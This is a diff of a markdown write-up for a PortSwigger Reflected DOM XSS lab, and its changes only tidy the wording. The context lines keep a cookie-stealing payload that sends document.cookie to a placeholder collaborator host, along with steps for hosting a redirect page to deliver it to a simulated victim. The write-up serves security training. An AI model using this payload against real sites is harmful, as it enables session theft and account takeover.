@@ -302,11 +302,11 @@ From the Site Map, open the `searchResults.js` file and notice that the JSON res
 \"-fetch('https://COLLABORATOR.com?reflects='+document.cookie)}//
 ```  
 
->The above payload every character is URL encoded and used as the search parameter value. Then because this lab do not have an exploit server I host my own `python3 -m http.server 80` web service and save the `index.html` contain the location target url between `<script>` tags. 
+>In the above payload every character is URL encoded and used as the search parameter value. This target do not have an exploit server, so I hosted my own `python3 -m http.server 80` web service and save the `index.html` file that contain the `location` target url between `<script>` tags. 
 
 ![Reflected DOM-XSS JSON cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
->In image above, I create insecure POC cookie value in my browser before simulating a victim user clicking on `http://localhost/index.html` link, same as Burp Exploit server, Deliver exploit to victim function.  
+>In the image above, I create insecure POC cookie value in my browser before simulating a victim user clicking on `http://localhost/index.html` link, same as Burp Exploit server, that is the same as the Deliver exploit to victim function.  
 
 [PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
 
